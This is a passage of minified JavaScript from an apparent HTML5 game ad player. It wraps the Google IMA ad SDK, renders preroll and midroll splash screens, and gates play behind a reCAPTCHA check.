                    Wf: [google.ima.AdEvent.Type.AD_METADATA, google.ima.AdEvent.Type.ALL_ADS_COMPLETED, google.ima.AdEvent.Type.CLICK, google.ima.AdEvent.Type.COMPLETE, google.ima.AdEvent.Type.DURATION_CHANGE, google.ima.AdEvent.Type.FIRST_QUARTILE, google.ima.AdEvent.Type.IMPRESSION, google.ima.AdEvent.Type.INTERACTION, google.ima.AdEvent.Type.LINEAR_CHANGED, google.ima.AdEvent.Type.LOADED, google.ima.AdEvent.Type.LOG, google.ima.AdEvent.Type.MIDPOINT, google.ima.AdEvent.Type.PAUSED, google.ima.AdEvent.Type.RESUMED, google.ima.AdEvent.Type.SKIPPABLE_STATE_CHANGED, google.ima.AdEvent.Type.SKIPPED, google.ima.AdEvent.Type.STARTED, google.ima.AdEvent.Type.THIRD_QUARTILE, google.ima.AdEvent.Type.USER_CLOSE, google.ima.AdEvent.Type.VOLUME_CHANGED, google.ima.AdEvent.Type.VOLUME_MUTED],
                    adTagURL: null,
                    muted: !0,
                    log: function(b, c) {
                        a.j.apply(a, w$([b, c]))
                    },
                    init: function(b, c, d, e, g, p) {
                        this.Xc = b;
                        this.muted = d;
                        this.adTagURL = e;
                        this.size = a.wd() ? a.ka : a.ic();
                        this.jc = p;
                        this.log(57);
                        this.Ja = new google.ima.AdDisplayContainer(this.Xc);
                        this.Ja.initialize();
                        this.Z = new google.ima.AdsLoader(this.Ja);
                        this.Z.getSettings().setVpaidMode(c);
                        this.Z.getSettings().setAutoPlayAdBreaks(!0);
                        this.Z.getSettings().setDisableFlashAds(!0);
                        this.Z.getSettings().setDisableCustomPlaybackForIOS10Plus(!0);
                        this.Z.addEventListener(google.ima.AdsManagerLoadedEvent.Type.ADS_MANAGER_LOADED, function(m) {
                            var r = new google.ima.AdsRenderingSettings;
                            r.jh = !0;
                            r.pi = !0;
                            r.bitrate = 1E3;
                            r.Oh = 12E8;
                            this.B = m.getAdsManager(r);
                            a.De() && (this.B.setVolume(0), a.X && a.X.ha && a.X.qb());
                            for (var x in google.ima.AdEvent.Type) this.Wf.push(google.ima.AdEvent.Type[x]);
                            m = a.df(this.Wf);
                            for (var A in m) this.B.addEventListener(m[A], this.Ha.bind(this));
                            this.B.addEventListener(google.ima.AdErrorEvent.Type.AD_ERROR, this.qa.bind(this));
                            this.B.addEventListener(google.ima.AdEvent.Type.ALL_ADS_COMPLETED, this.Ha.bind(this));
                            this.B.addEventListener(google.ima.AdErrorEvent.Type.AD_ERROR, this.qa.bind(this));
                            this.B.addEventListener(google.ima.AdEvent.Type.CONTENT_PAUSE_REQUESTED, this.rb.bind(this));
                            this.B.addEventListener(google.ima.AdEvent.Type.CONTENT_RESUME_REQUESTED, this.sb.bind(this));
                            this.B.addEventListener(google.ima.AdErrorEvent.Type.AD_ERROR, this.qa.bind(this), !1);
                            try {
                                this.B.init(this.size.w, this.size.h, google.ima.ViewMode.NORMAL), this.log(58)
                            } catch (z) {
                                this.log(59, z.getMessage())
                            }
                        }.bind(this), !1);
                        this.ha = !0
                    },
                    getAd: function(b) {
                        this.count++;
                        var c = "mad=" + this.count,
                            d = b.match(/cust_params=([0-9A-Za-z%_\-\.]+)/i);
                        null !== d && 0 < d.length ? b = b.replace(d[1], d[1] + encodeURIComponent("&" + c)) : b = b += (0 < b.indexOf("?") ? "&" : "?") + "cust_params=" + encodeURIComponent(c);
                        b = a.Tf(b, this.size);
                        this.S = new google.ima.AdsRequest;
                        this.S.adTagUrl = b;
                        this.S.linearAdSlotWidth = this.size.w;
                        this.S.linearAdSlotHeight = this.size.h;
                        this.S.nonLinearAdSlotWidth = this.size.w;
                        this.S.nonLinearAdSlotHeight = this.size.h;
                        this.S.setAdWillAutoPlay(!1);
                        this.S.setAdWillPlayMuted(!1);
                        !0 === a.options.he && this.S.setAdWillPlayMuted(!0);
                        this.S.forceNonLinearFullSlot = !0;
                        this.S.vastLoadTimeout = -1;
                        this.Z.requestAds(this.S)
                    },
                    Ha: function(b) {
                        if (this.Of) return !1;
                        b.type === google.ima.AdEvent.Type.LOADED && (this.jg.push(b), a.j(60), this.currentAd = b.getAd(), a.Vd(), !0 === a.options.forceAutoplay && !1 === a.bb && this.B.setVolume(0), !0 === a.options.he && (a.B.setVolume(0), this.B.setVolume(0), this.S.setAdWillPlayMuted(!0)), this.B.start());
                        b.type === google.ima.AdEvent.Type.STARTED && (this.jg.push(b), this.aa(), this.B.pause(), a.fb.push(this))
                    },
                    dj: function() {
                        a.currentAd = this.currentAd;
                        a.S = this.S;
                        a.B = this.B;
                        var b = a.df(this.Wf),
                            c;
                        for (c in b) this.B.removeEventListener(b[c], this.Ha.bind(this)), this.B.addEventListener(b[c], this.jc.Ha);
                        this.B.removeEventListener(google.ima.AdErrorEvent.Type.AD_ERROR, this.qa.bind(this));
                        this.B.removeEventListener(google.ima.AdEvent.Type.ALL_ADS_COMPLETED, this.Ha.bind(this));
                        this.B.removeEventListener(google.ima.AdErrorEvent.Type.AD_ERROR, this.qa.bind(this));
                        this.B.removeEventListener(google.ima.AdEvent.Type.CONTENT_PAUSE_REQUESTED, this.rb.bind(this));
                        this.B.removeEventListener(google.ima.AdEvent.Type.CONTENT_RESUME_REQUESTED, this.sb.bind(this));
                        this.B.removeEventListener(google.ima.AdErrorEvent.Type.AD_ERROR, this.qa.bind(this), !1);
                        this.B.addEventListener(google.ima.AdErrorEvent.Type.AD_ERROR, this.jc.qa);
                        this.B.addEventListener(google.ima.AdEvent.Type.ALL_ADS_COMPLETED, this.jc.Ha);
                        this.B.addEventListener(google.ima.AdErrorEvent.Type.AD_ERROR, this.jc.qa);
                        this.B.addEventListener(google.ima.AdEvent.Type.CONTENT_PAUSE_REQUESTED, this.jc.rb);
                        this.B.addEventListener(google.ima.AdEvent.Type.CONTENT_RESUME_REQUESTED, this.jc.sb);
                        this.B.addEventListener(google.ima.AdErrorEvent.Type.AD_ERROR, this.jc.qa, !1);
                        b = w$b(this.jg);
                        for (c = b.next(); !c.done; c = b.next()) a.B.dispatchEvent(c.value)
                    },
                    qa: function() {},
                    rb: function() {},
                    sb: function() {},
                    destroy: function() {
                        this.Z && (this.Z.contentComplete(), this.Z.destroy(), this.Z = null);
                        this.Ja && (this.Ja.destroy(), this.Ja = null);
                        this.B && (this.B.destroy(), this.B = null);
                        this.ha = !1
                    },
                    start: function() {
                        this.Of || (this.Of = !0, this.dj(), this.show(), this.B.resume(), a.De() && (a.B.setVolume(0), a.va.Ze(), a.X && a.X.ha && a.X.qb()))
                    },
                    pause: function() {
                        this.B.pause()
                    },
                    resume: function() {
                        this.B.setVolume(1);
                        this.B.resume()
                    },
                    hi: function() {},
                    fi: function() {},
                    show: function() {
                        this.Xc.classList.remove("wgHidden")
                    },
                    aa: function() {
                        this.Xc.classList.add("wgHidden")
                    },
                    update: function() {}
                }
            },
            get zc() {
                return {
                    bg: "https://scylla.wgplayer.com/f_" + (a.Lh() ? "jpg" : "webp") + "/w_220/q_90/",
                    thumb: "https://scylla.wgplayer.com/f_" + (a.Lh() ? "jpg" : "webp") + "/w_220/q_90/"
                }
            },
            ja: null,
            Ni: function() {
                var b = a.ub(a.options.gameName, a.options.titleExtract);
                a.ja = a.F("div", "SplashPreroll");
                a.ja.classList.add("wgSplash");
                if (a.options.gameDescription) var c = a.options.gameDescription;
                else 0 < document.querySelectorAll('[name="Description"]').length ? c = document.querySelectorAll('[name="Description"]')[0].content : 0 < document.querySelectorAll('[name="description"]').length ? c = document.querySelectorAll('[name="description"]')[0].content : 0 < document.querySelectorAll('[property="og:description"]').length && (c = document.querySelectorAll('[property="og:description"]')[0].content);
                var d = "";
                if ("object" === typeof a.options.afv) a.ja.classList.add("wgOC"), d = d + '.wgSplashPreroll.wgOC{ background-color:unset; padding:5%; box-sizing:border-box;}.wgSplashPreroll.wgOC *{font-family:"Open Sans"; color:#fff;}.wgSplashPreroll.wgOC:before{ content:" "; width:100%; height:100%; top:0; left:0; position:absolute; background-repeat:no-repeat; box-sizing:border-box; background-size:cover; background-align:center center; -webkit-filter: blur(10px); -moz-filter: blur(10px); -o-filter: blur(10px); -ms-filter: blur(10px); filter: blur(10px); opacity:.8;}.wgSplashPreroll.wgOC:before{ background-image:url("' +
                    (a.options.gameThumbnail + '")}'), a.s(d + '.wgOC{ position:relative; }.wgOCTitle{ color:#fff; font-family:"open Sans"; font-size:40px; font-weight:100; letter-spacing:-1px; padding: 0 10%; text-shadow: 1px 1px 2px rgba(0,0,0,1); line-height:35px; }.wgOCThumbnail{ display:grid; grid-template-columns:50% 50%; padding:0;}.wgOCThumbnail > div{ display:block; width:auto; color:#fff;}.wgOCThumbnail > div:first-child{ text-align:right; padding:10px 40px 10px 10px;  border-right:1px solid rgba(255,255,255,.2);}.wgOCThumbnail > div:last-child{ text-align:left; padding-left:40px; align-self: center; }.wgOCThumbnail .wgOCMetadata{ font-size:14px; text-shadow: 1px 1px 2px rgba(0,0,0,1);}.wgOCThumbnail .wgOCimg img{ max-width:100%; border-radius:10px; overflow:hidden; border:1px solid rgba(255,255,255,.2); max-height:100px;}.wgOCPlayContent{ padding:40px; }.wgOCPlayContent > div:first-child{ background: rgba(255,255,255,.1); padding:20px; border-radius:100px; overflow:hidden; display:grid; grid-template-columns:120px auto; box-sizing:border-box;}.wgOCPlayContent .wgOCPlay{ width:120px; height:120px; border:5px solid #fdca00; border-radius:50%; background:rgba(255,255,255,.10);box-sizing:border-box; position:relative; overflow:hidden;}.wgOCPlayContent .wgOCPlay:before{ content:"\\25BA"; position:absolute; top:0; left:0; width:100%; height:100%; font-size:75px; padding-left:10px;}.wgOCPlayContent .wgOCInfo{ padding:0 20px; box-sizing:border-box; align-self: center; font-size:18px; text-align:left; text-shadow: 1px 1px 2px rgba(0,0,0,1); font-weight:100;}'), a.ja.innerHTML = '<div class="wgCenter wgOC wgSplash"><div class="wgOCTitle">' + (a.options.afv.title ? a.options.afv.title : a.ub(a.options.gameName, a.options.titleExtract)) + '</div><div class="wgOCPlayContent"><div><div class="wgOCPlay"></div><div class="wgOCInfo">' + a.options.afv.summary + '</div></div></div><div class="wgOCThumbnail"><div class="wgOCimg"><img src="' + a.options.gameThumbnail + '"></div><div class="wgOCMetadata"><div>' + a.options.afv.info1 + "</div><div>" + a.options.afv.info2 + "</div></div></div></div>";
                else {
                    var e;
                    c ? 200 <= c.length ? e = c.replace(/<[^>]*>/g, "").slice(0, 200) + "..." : e = c.replace(/<[^>]*>/g, "") : e = "Game will start after a short ad. Ads helps us keep our games free to play. Thank you for your support.";
                    a.ja.innerHTML = '\n                                    <div class="wgBg"> \n                                        <div class="wgBgImage"></div>                                        \n                                    </div>\n                                    <div class="wgSplashContent"> \n                                        <div class="wgCenterContent"> \n                                            <div> \n                                                <div class="wgPrerollInfo"> \n                                                    <div class="wgTitle">' +
                        b + '</div>\n                                                    <div class="wgPrerollDescription">' + e + '</div>\n                                                    <div class="wgButtons"> \n                                                        <div class="wgPrerollCTA">\n                                                            <span>' + (a.options.playGameText ? a.options.playGameText : "Play game") + "</span>\n                                                        </div>\n                                                        " +
                        ("object" === typeof a.options.wb ? '\n                                                        <div class="wgPrerollWb">\n                                                            <span>' + (a.options.walkthroughText ? a.options.walkthroughText : "Walkthrough") + "</span>\n                                                        </div>                                                        \n                                                        " : "") + (a.options.gameLogo ? '<div class="wgPrerollLogoBottom"></div>' : "") + '\n                                                    </div>\n                                                </div>\n                                            </div>\n                                            <div> \n                                                <div class="wgThumb"> \n                                                    <div></div>\n                                                </div>\n                                            ' + (a.options.gameLogo ? '<div class="wgPrerollLogo"></div>' : "") + "\n                                        </div>\n                                    </div>\n                                    "
                }
                "object" === typeof a.options.wb && a.s(".wgWbutton{ display: flex; width: fit-content; height: fit-content; color: #fff; margin: auto; position: relative; border-radius: 10px; padding: 10px 20px; background: #7a9929; text-shadow: 1px 1px 1px #000; box-shadow: 1px 1px 3px rgba(0,0,0,.5); border: 2px solid #fff;}");
                a.tc(a.ja, "mousedown touchstart", function(g) {
                    a.Bg = g.target
                });
                a.tc(a.ja, "touchmove", function() {
                    a.Bg = null
                });
                a.tc(a.ja, "mousedown touchend", a.xh)
            },
            Bg: null,
            Yg: -1,
            Xg: function(b, c, d, e) {
                if (a.Aa("_wgcap__")) return a.j(64), b.call(c, e || null), !1;
                a.Yg = setInterval(function() {
                    a.j(65);
                    null !== a.Fd || window.grecaptcha ? !0 === a.Fd || window.grecaptcha ? (a.j(67), clearInterval(a.Yg), window.grecaptcha.ready(function() {
                        var g = a.yc() + d;
                        g = g.replace(/\W/gi, "");
                        a.j(68, g);
                        window.grecaptcha && window.grecaptcha.execute && (a.j(69), window.grecaptcha.execute("6LczYa0ZAAAAAIv-piHSiu9ukgvBxIr_rskeengV", {
                            action: g
                        }).then(function(p) {
                            a.j(70);
                            var m = new XMLHttpRequest;
                            m.open("POST", "https://wgplayer.xyz/c/", !0);
                            m.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                            m.onreadystatechange = function() {
                                if (4 === m.readyState && "200" == m.status) {
                                    a.j(71);
                                    a.j(72);
                                    b.call(c, e || null);
                                    var r = JSON.parse(m.responseText);
                                    a.vd("_wgcap__", JSON.stringify({
                                        hk: r.hk,
                                        Hk: r.Hk
                                    }), 720);
                                    a.j(73)
                                }
                            };
                            m.send("g-recaptcha-response=" + p)
                        }))
                    })) : !1 === a.Fd && b.call(c, e || null) : a.j(66)
                }, 100)
            },
            xh: function(b) {
                b = void 0 === b ? null : b;
                var c;
                b && (c = b.path || b.composed && b.composedPath());
                if (a.Bg !== b.target || 2 === b.button || c && -1 === c.indexOf(a.contentContainer.querySelectorAll(".wgThumb")[0]) && -1 === c.indexOf(a.contentContainer.querySelectorAll(".wgPrerollCTA")[0]) && -1 === c.indexOf(a.contentContainer.querySelectorAll(".wgPrerollWb")[0])) return !1;
                a.j(74);
                if (!0 === a.isFlashGame && !1 === a.jb && !1 === window.preroll.config.loaderObjectName.jb) return a.j(75, a.isFlashGame, a.jb), !1;
                if (c && -1 < c.indexOf(a.contentContainer.querySelectorAll(".wgPrerollWb")[0])) return (c = document.querySelector(a.options.wb.container)) && c.scrollIntoView({
                    behavior: "smooth"
                }), !1;
                !0 !== a.options.cap || a.Aa("_wgcap__") ? (b && b.cancelable && b.preventDefault(), !1 === a.ed ? (a.Xd("Preroll"), a.hh().then(function() {
                    a.za || a.Ld();
                    a.za.initialize();
                    a.Ih();
                    a.Nf(b)
                })) : (a.za || a.Ld(), a.za.initialize(), a.Ih(), a.Nf(b))) : (b && b.preventDefault(), a.Xg(a.Nf, a, "preroll", b || null))
            },
            Nf: function(b) {
                b = void 0 === b ? null : b;
                a.contextMenu && (a.contextMenu.Dh(), a.contextMenu.aa());
                a.u().classList.add("wgInited");
                "function" === typeof window[a.options.prerollCtaClick] && window[a.options.prerollCtaClick].call(b);
                if (b && !1 !== a.options.capturePrerollClick) try {
                    b.preventDefault(), b.stopImmediatePropagation()
                } catch (d) {}
                try {
                    window.dispatchEvent(new CustomEvent("wgPrerollPlay", {
                        detail: null
                    }))
                } catch (d) {
                    a.j(d)
                }
                a.j(76);
                0 === Object.keys(a.R.preroll).length && a.Bb && !0 !== a.options.prefetchPreroll && a.destroy();
                a.ae++;
                0 === a.lt && a.tb.show();
                if ((a.Bb || a.Pa) && !1 === a.ie) {
                    var c = document.querySelectorAll('body + ins[id*=WGIP][data-vignette-loaded="true"] iframe')[0];
                    document.querySelectorAll('body + ins[id*=WGIP][data-vignette-loaded="true"]')[0] && c || (c = document.querySelectorAll(".wgPrerollIntCTA"), 0 < c.length && c[0].parentNode.removeChild(c[0]), 0 === a.lt ? a.Bc() : a.Xd("Preroll"), a.jingle.ha && a.jingle.init(), a.bb = null !== b, a.Z || a.ze(), a.j(77), a.Bb = !1, "function" === typeof window[a.options.splashPreCallback] && window[a.options.splashPreCallback].call(), 0 === a.lt ? a.bd() : setTimeout(function() {
                        a.bd()
                    }, a.lt), 0 === a.lt && a.pg())
                } else a.j(78)
            },
            Xd: function(b) {
                try {
                    var c = ("preroll" === b.toLowerCase() ? a.Ra() : a.ad()).querySelectorAll(".wgPrerollCTA span")[0];
                    c.classList.add("loadingButton");
                    c.innerHTML = a.currentAd ? "STARTING ... " : "LOADING"
                } catch (d) {}
            },
            Ac: function(b) {
                try {
                    var c = ("preroll" === b.toLowerCase() ? a.Ra() : a.ad()).querySelectorAll(".wgPrerollCTA span")[0];
                    c && (c.classList.remove("loadingButton"), c.innerHTML = a.O ? a.options.continueGameText : a.options.playGameText)
                } catch (d) {}
            },
            Ra: function() {
                return a.ja
            },
            xd: function() {
                a.j(79);
                0 === a.u().getBoundingClientRect().width && 0 === a.u().getBoundingClientRect().height && (a.Se(), a.vb());
                !0 !== a.Ab && a.Ac("preroll");
                a.O = !1;
                a.Bb = !0;
                !1 !== a.options.remove && a.$j();
                a.Td();
                a.Ed();
                a.u().insertBefore(a.ja, a.u().firstChild);
                a.ja.classList.remove("lowZi");
                a.ja.classList.remove("wgHidden");
                "undefined" !== typeof f.splashPreDisplayed && window[f.splashPreDisplayed].call()
            },
            bb: !1,
            la: null,
            Sd: null,
            nd: null,
            Mi: function() {
                var b = a.ub(a.options.gameName, a.options.titleExtract);
                if (a.options.gameDescription) var c = a.options.gameDescription;
                else 0 < document.querySelectorAll('[name="Description"]').length ? c = document.querySelectorAll('[name="Description"]')[0].content : 0 < document.querySelectorAll('[name="description"]').length ? c = document.querySelectorAll('[name="description"]')[0].content : 0 < document.querySelectorAll('[property="og:description"]').length && (c = document.querySelectorAll('[property="og:description"]')[0].content);
                var d;
                c ? 200 <= c.length ? d = c.replace(/<[^>]*>/g, "").slice(0, 200) + "..." : d = c.replace(/<[^>]*>/g, "") : d = "Game will continue after a short ad. Ads helps us keep our games free to play. Thank you for watching the ads and your support.";
                a.la = a.F("div", "SplashMidroll");
                a.la.classList.add("wgSplash");
                a.Sd = a.F("div", "Center");
                a.Sd.innerHTML = '\n                                    <div class="wgBg"> \n                                        <div class="wgBgImage"></div>\n                                    </div>\n                                    <div class="wgSplashContent"> \n                                        <div class="wgCenterContent"> \n                                            <div> \n                                                <div class="wgPrerollInfo"> \n                                                    <div class="wgTitle">' +
                    b + '</div>\n                                                    <div class="wgPrerollDescription">' + d + '</div>\n                                                    <div class="wgButtons"> \n                                                        <div class="wgPrerollCTA">\n                                                            <span>' + (a.options.continueGameText ? a.options.continueGameText : "Continue game") + "</span>\n                                                        </div>\n                                                        " +
                    ("object" === typeof a.options.wb ? '\n                                                        <div class="wgPrerollWb">\n                                                            <span>' + (a.options.walkthroughText ? a.options.walkthroughText : "Walkthrough") + "</span>\n                                                        </div>                                                        \n                                                        " : "") + (a.options.gameLogo ? '<div class="wgPrerollLogoBottom"></div>' : "") + '\n                                                    </div>\n                                                </div>\n                                            </div>\n                                            <div> \n                                                <div class="wgThumb"> \n                                                    <div></div>\n                                                </div>\n                                            ' + (a.options.gameLogo ? '<div class="wgPrerollLogo"></div>' : "") + "\n                                        </div>\n                                    </div>\n                                    ";
                a.la.appendChild(a.Sd);
                a.nd = a.F("div", "Center wgRw wgHidden");
                a.nd.innerHTML = '<div class="wgTimeLimit">Time limit reached</div><div class="wgThumbnail"></div><div class="wgClear"></div><div class="wgPlayGame wgMidrollButton"><span>' + (a.options.Xi ? a.options.Xi : "Extra time") + '</span></div><div class="wgClear"></div><div class="wgPlayGame wgMoreGames wgMidrollButton"><span>' +
                    (a.options.Tj ? a.options.Tj : "More games") + '</span></div><div class="wgTitle">' + (b + '</div><div class="wgPlayMore"></div>');
                a.la.appendChild(a.nd);
                a.tc(a.la, "mouseup touchend", a.vh)
            },
            vh: function(b) {
                b = void 0 === b ? null : b;
                if (b) {
                    b.cancelable && b.preventDefault();
                    var c = b.path || b.composed && b.composedPath()
                }
                if (c && -1 === c.indexOf(a.contentContainer.querySelectorAll(".wgThumb")[0]) && -1 === c.indexOf(a.contentContainer.querySelectorAll(".wgPrerollCTA")[0]) && -1 === c.indexOf(a.contentContainer.querySelectorAll(".wgPrerollWb")[0])) return !1;
                if (c && -1 < c.indexOf(a.contentContainer.querySelectorAll(".wgPrerollWb")[0])) return (c = document.querySelector(a.options.wb.container)) && c.scrollIntoView({
                    behavior: "smooth"
                }), !1;
                a.j(80);
                !0 !== a.options.cap || a.Aa("_wgcap__") ? (a.j(82), !1 === a.ed ? (a.Xd("Midroll"), a.hh().then(function() {
                    a.Mf(b)
                })) : a.Mf(b)) : (a.j(81), b && b.preventDefault(), a.Xg(a.Mf, a, "preroll", b || null))
            },
            Mf: function() {
                a.Bb || !0 === a.Pa ? (a.contextMenu && (a.contextMenu.Dh(), a.contextMenu.aa()), a.u().classList.add("wgInited"), a.ae++, 0 === a.lt ? (a.tb.show(), a.kc()) : a.Xd("Midroll"), a.bb = !0, a.za || a.Ld(), a.Z || a.ze(), a.za.initialize(), a.j(83), a.Bb = !1, "undefined" !== typeof f.splashMidCallback && window[f.splashMidCallback].call(), 0 === a.lt ? (a.se(), a.pg()) : (new Promise(function(b) {
                    var c = setInterval(function() {
                        var d = a.u().getBoundingClientRect();
                        0 < d.width && 0 < d.height && (clearInterval(c), b())
                    }, 100)
                })).then(function() {
                    a.se()
                })) : a.j(84)
            },
            hg: !1,
            ld: !1,
            ug: function(b) {
                b = void 0 === b ? null : b;
                a.xe();
                a.j(85);
                a.da && a.da.pa && a.da.pa.SendMessage(a.da.lb, "Pause");
                a.Ac("midroll");
                a.O = !0;
                a.Ed();
                a.Bb = !0;
                a.Td();
                a.u().insertBefore(a.la, a.u().firstChild);
                a.u().classList.add("wgMidroll");
                b = b && b.callToAction ? b.callToAction : a.options.callToAction ? a.options.callToAction : null;
                "string" === typeof b && (a.la.querySelectorAll(".wgPrerollCTA span")[0].innerHTML = b);
                a.wk();
                a.la.classList.remove("lowZi");
                a.la.classList.remove("wgHidden");
                a.la.classList.remove("removed");
                a.options.splashMidDisplayed && window[a.options.splashMidDisplayed].call();
                a.hg = !0
            },
            wk: function() {
                a.nd.classList.add("wgHidden");
                a.Sd.classList.remove("wgHidden")
            },
            xk: function() {
                a.Sd.classList.add("wgHidden");
                a.nd.classList.remove("wgHidden")
            },
            ad: function() {
                return a.la
            },
            lg: null,
            gg: null,
            Ng: function(b) {
                "preroll" !== b || a.lg || (a.lg = a.F("div", "PrerollImageSplashBg"), a.Ra().insertBefore(a.lg, a.Ra().firstChild));
                "midroll" !== b || a.gg || (a.gg = a.F("div", "MidrollImageSplashBg"), a.ad().insertBefore(a.gg, a.ad().firstChild))
            },
            ac: null,
            Hi: function() {
                a.ac = a.F("div", "AudioBg");
                a.u().insertBefore(a.ac, a.u().firstChild);
                a.ac.classList.add("wgHidden");
                a.s("." + a.ac.classList[0] + "{\n                position:absolute;\n                top:0;\n                left:0;\n                width:100%;\n                height:100%;\n                background-image: url(\"data:image/svg+xml,%3Csvg id='Layer_1' data-name='Layer 1' xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1023.55 782.83'%3E%3Cdefs%3E%3Cstyle%3E .cls-1 %7B fill: %23c9ccce; opacity:.3; %7D %3C/style%3E%3C/defs%3E%3Cpath class='cls-1' d='M522.19,403.24a13.86,13.86,0,0,1-13.82-13.84V315.19A13.82,13.82,0,0,1,528.75,303l66.35,35.81a13.82,13.82,0,0,1,.36,24.12L563,381.72A5.05,5.05,0,0,1,558,373l32.41-18.77a3.72,3.72,0,0,0-.09-6.48L524,311.92a3.71,3.71,0,0,0-5.47,3.27V389.4a3.71,3.71,0,0,0,5.57,3.21l7.63-4.42a5.06,5.06,0,0,1,5.07,8.75l-7.63,4.42A13.76,13.76,0,0,1,522.19,403.24Z' transform='translate(-44.14 -22.29)' /%3E%3Cpath class='cls-1' d='M75.32,470.86a31.18,31.18,0,1,1,31.18-31.18A31.21,31.21,0,0,1,75.32,470.86Zm0-52.26a21.08,21.08,0,1,0,21.07,21.08A21.11,21.11,0,0,0,75.32,418.6Z' transform='translate(-44.14 -22.29)' /%3E%3Cpath class='cls-1' d='M308.82,185.57a4,4,0,0,1-.49,0,5.05,5.05,0,0,1-4.55-5.51l.27-2.75a5.05,5.05,0,0,1,10.06,1l-.26,2.75A5.07,5.07,0,0,1,308.82,185.57Z' transform='translate(-44.14 -22.29)' /%3E%3Cpath class='cls-1' d='M222.79,315.48a46,46,0,1,1,46-46,5.06,5.06,0,1,1-10.11,0,35.88,35.88,0,1,0-22.52,33.33,5.05,5.05,0,0,1,3.77,9.38A45.67,45.67,0,0,1,222.79,315.48Z' transform='translate(-44.14 -22.29)' /%3E%3Cpath class='cls-1' d='M859.32,458.49a5.06,5.06,0,0,1-1-10,32.06,32.06,0,1,0-30.86-10.63,5.06,5.06,0,1,1-7.7,6.56,42.15,42.15,0,1,1,40.59,14A5.05,5.05,0,0,1,859.32,458.49Z' transform='translate(-44.14 -22.29)' /%3E%3Cpath class='cls-1' d='M830.37,249.51l-.52,0a5.06,5.06,0,0,1-4.51-5.54L827,228a5.05,5.05,0,0,1,10,1L835.4,245A5.06,5.06,0,0,1,830.37,249.51ZM876.49,212a4.53,4.53,0,0,1-.52,0l-16-1.63a5.06,5.06,0,0,1,1-10.06l16,1.64a5.05,5.05,0,0,1-.51,10.08ZM808.77,205a4.61,4.61,0,0,1-.52,0l-15.94-1.63a5.06,5.06,0,1,1,1-10.06l15.94,1.63a5.05,5.05,0,0,1-.51,10.08Zm28.54-23.23a4.53,4.53,0,0,1-.52,0,5.05,5.05,0,0,1-4.52-5.54l1.64-15.95a5.05,5.05,0,0,1,10.05,1l-1.63,15.95A5.06,5.06,0,0,1,837.31,181.79Z' transform='translate(-44.14 -22.29)' /%3E%3Cpath class='cls-1' d='M99.48,305.08a4,4,0,0,1-.49,0,5,5,0,0,1-4.55-5.51l.27-2.75a5.05,5.05,0,1,1,10.06,1l-.27,2.75A5.05,5.05,0,0,1,99.48,305.08Z' transform='translate(-44.14 -22.29)' /%3E%3Cpath class='cls-1' d='M681.06,158.7a4.1,4.1,0,0,1-.49,0,5.05,5.05,0,0,1-4.54-5.52l.26-2.74a5.05,5.05,0,1,1,10.06,1l-.26,2.74A5.06,5.06,0,0,1,681.06,158.7Z' transform='translate(-44.14 -22.29)' /%3E%3Cpath class='cls-1' d='M990.31,510.33a5,5,0,0,1-1.51-.23,5.06,5.06,0,0,1-3.32-6.33l4.76-15.3a5.05,5.05,0,1,1,9.65,3l-4.76,15.31A5.05,5.05,0,0,1,990.31,510.33ZM1043,482.68a5.26,5.26,0,0,1-1.5-.23l-15.31-4.77a5.05,5.05,0,1,1,3-9.65l15.3,4.76a5.06,5.06,0,0,1-1.5,9.89Zm-65-20.23a4.93,4.93,0,0,1-1.5-.23l-15.31-4.76a5.06,5.06,0,0,1,3-9.66l15.31,4.77a5.05,5.05,0,0,1-1.51,9.88Zm32.58-17.12a5.19,5.19,0,0,1-1.5-.22,5.06,5.06,0,0,1-3.33-6.33l4.77-15.31a5.05,5.05,0,1,1,9.65,3l-4.76,15.3A5.06,5.06,0,0,1,1010.53,445.33Z' transform='translate(-44.14 -22.29)' /%3E%3Cpath class='cls-1' d='M269,493.61a5,5,0,0,1-4.23-2.28L256,477.94a5.05,5.05,0,1,1,8.44-5.55l8.81,13.39a5,5,0,0,1-4.21,7.83Zm-58.25-12a5.06,5.06,0,0,1-2.78-9.28l13.39-8.81A5.06,5.06,0,0,1,227,472l-13.39,8.81A5.07,5.07,0,0,1,210.78,481.6Zm56.87-37.42a5.06,5.06,0,0,1-2.79-9.28l13.39-8.81a5.06,5.06,0,0,1,5.56,8.45l-13.39,8.81A5.06,5.06,0,0,1,267.65,444.18Zm-36-7.43a5,5,0,0,1-4.23-2.28l-8.81-13.39a5.05,5.05,0,0,1,8.44-5.56l8.81,13.39a5.05,5.05,0,0,1-4.21,7.84Z' transform='translate(-44.14 -22.29)' /%3E%3Cpath class='cls-1' d='M455.78,181.4A40,40,0,1,1,474,105.69a5.05,5.05,0,1,1-4.6,9,29.61,29.61,0,0,0-13.62-3.27,29.94,29.94,0,1,0,29.67,34,5.05,5.05,0,1,1,10,1.34A40.16,40.16,0,0,1,455.78,181.4Z' transform='translate(-44.14 -22.29)' /%3E%3Cpath class='cls-1' d='M962,303.7a4.18,4.18,0,0,1-.5,0,5.06,5.06,0,0,1-4.54-5.52l.26-2.74a5.06,5.06,0,0,1,10.07,1l-.27,2.75A5,5,0,0,1,962,303.7Z' transform='translate(-44.14 -22.29)' /%3E%3Cpath class='cls-1' 